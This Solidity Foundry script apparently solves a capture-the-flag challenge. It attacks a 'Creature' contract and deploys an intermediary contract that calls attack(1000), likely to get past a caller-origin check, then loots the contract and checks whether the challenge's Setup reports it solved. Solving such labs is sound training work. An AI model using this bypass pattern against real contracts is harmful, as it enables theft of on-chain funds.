// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Creature} from "../src/Creature.sol";
import {Setup} from "../src/Setup.sol";

contract solve is Script{
    address target = 0xb6012e3738aED06ffF198D0A0098Ec4349abaeA8;
    address setup_address = 0xA0BD78AFD9BEF35E2DB847f61dC3E4645e1a9B0B;
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Setup setup = Setup(setup_address);
        Creature creature = Creature(target);
        creature.attack(0);
        Middle m = new Middle();
        m.attack();
        creature.loot();
        console.log(setup.isSolved());
        vm.stopBroadcast();
    }
}
contract Middle {
    function attack() public
    {
        Creature creature = Creature(0xb6012e3738aED06ffF198D0A0098Ec4349abaeA8);
        creature.attack(1000);
    }
}